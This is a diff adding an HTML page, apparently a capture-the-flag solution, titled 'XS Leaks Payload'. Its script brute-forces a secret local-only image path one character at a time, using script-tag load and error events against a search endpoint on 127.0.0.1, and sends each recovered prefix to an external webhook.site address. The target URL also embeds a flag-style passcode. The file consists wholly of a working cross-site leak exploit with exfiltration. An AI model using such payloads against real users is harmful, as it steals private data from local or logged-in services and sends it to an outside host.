@@ -1,0 +1,56 @@
+<html>
+	<body>
+		<p>XS Leaks Payload</p>
+		<script>
+			var target = 'http://127.0.0.1:4242/api/topsecretmemes/search?passcode=ISS{tH3_m3m3m35_cAv5eD_tH3_l3aK!1!}&q=';
+            var path = "/memes/localonly/";
+            
+            // CHANGE ME TO YOUR OWN WEB HOOK!
+            var weeb_hook = 'https://webhook.site/3f5b57fd-9f75-48b9-a3cf-6792e1afc66d';
+
+            // Characters of the path are either hex chars or the .jpg at the end
+            var chars = 'abcdef0123456789'+'.jpg';
+            var found = false;
+            var tasks = [];
+
+            function tryPath(f, c) {
+                return new Promise((resolve, reject) => {
+                    var body = document.getElementsByTagName('body')[0];
+                    var script = document.createElement("script");
+                    var payload = f + c;
+
+                    script.src = target + payload;
+                    script.onload = () => {resolve(c)};
+                    script.onerror = () => {reject()};
+                    body.appendChild(script);
+                });
+            }
+
+            async function getPath(f) {
+                var temp = "";
+                found = false;
+                tasks = [];
+                var c = "";
+                for (var i = 0; i < chars.length; i++) {
+                    c = chars[i];
+                    tasks.push(tryPath(f, c).then((result) => {
+                        temp = result;
+                        found = true;
+                    }).catch(() => {}))
+                }
+
+                await Promise.all(tasks);
+
+                path = path + temp;
+                fetch(weeb_hook + '?path=' + path);
+                if (!found) {
+                    return;
+                }
+
+                getPath(path);
+            }
+
+            getPath(path);
+		</script>
+	</body>
+</html>
